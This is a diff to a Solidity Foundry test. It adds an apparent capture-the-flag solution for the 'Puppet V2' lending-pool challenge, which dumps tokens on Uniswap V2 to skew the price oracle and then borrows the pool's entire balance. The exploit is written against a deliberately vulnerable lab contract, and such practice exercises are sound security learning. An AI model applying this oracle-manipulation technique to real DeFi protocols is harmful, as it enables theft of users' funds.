@@ -103,6 +103,38 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+       
+        vm.startPrank(attacker);
+      
+       //lets approve uniswap router the abilty to mange out tokens
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE );
+
+        // dvt to Weth path see (https://solidity-by-example.org/defi/uniswap-v2/) for an example 
+        address[] memory path;
+        path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        
+        // lets then attempt to swap all of my dvt for weth 
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(ATTACKER_INITIAL_TOKEN_BALANCE,1,path, payable(attacker), DEADLINE);
+       
+    
+        // lets calculate deposit required now for all the tokens now that we swapped all of our tokens for weth. Output -> 29.4 weth
+
+        puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+       
+        
+        // lets get some weth 
+        weth.deposit{value: attacker.balance}();
+
+        // We need to have more than 29.4 weth to drain the pool. Output -> 29.9 weth
+         weth.balanceOf(attacker);
+
+
+        weth.approve(address(puppetV2Pool), weth.balanceOf(attacker));
+
+        // Borrow total amount of tokens
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
 
         /**
          * EXPLOIT END *
